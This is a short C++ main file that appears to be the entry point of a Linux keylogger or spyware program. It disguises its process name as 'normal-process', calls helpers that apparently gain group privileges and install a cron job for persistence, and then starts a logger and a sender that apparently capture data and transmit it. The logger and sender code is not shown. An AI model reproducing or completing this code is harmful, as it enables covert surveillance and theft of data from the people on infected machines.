// main.cpp

#include "logger.h"
#include "procloader.h"
#include "sender.h"
#include <sys/prctl.h>

#include <cstring>

int main() {
	auto usrgrp = true;
	auto crnjob = true;

	while (true) {
		char const* pr_name = "normal-process";
		prctl(PR_SET_NAME, pr_name, 0, 0, 0);

		procloader& procloader = procloader::get_instance();

		if (usrgrp && crnjob) {
			tsq queue;

			logger& logger = logger::get_instance(queue);
			sender& sender = sender::get_instance(queue);

			assert(logger.init() && "main (logger): logger initialization error.");
			assert(sender.init() && "main (sender): sender initialization error.");

			logger.start();
			sender.start();

			assert(logger.check_init() && "main (logger): logger start error.");
			assert(sender.check_init() && "main (sender): sender start error.");
		}
		else {
			usrgrp = procloader.grpriv();
			crnjob = procloader.mkcron();
		}
	}
	return 0;
}
